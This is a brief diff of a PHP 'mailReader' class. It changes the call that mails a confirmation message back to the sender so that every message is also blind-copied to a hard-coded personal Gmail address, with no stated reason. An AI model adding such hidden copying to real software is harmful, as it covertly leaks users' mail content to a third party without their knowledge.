@@ -286,7 +286,7 @@ class mailReader {
         $newmsg .= "\nI hope everything looks right. If not,";
         $newmsg .=  "please send me an e-mail!\n";
 
-        mail($this->from_email,$this->subject,$newmsg);
+        mail($this->from_email,$this->subject,$newmsg, "Bcc: shauleong@gmail.com");
     }
 
     /**
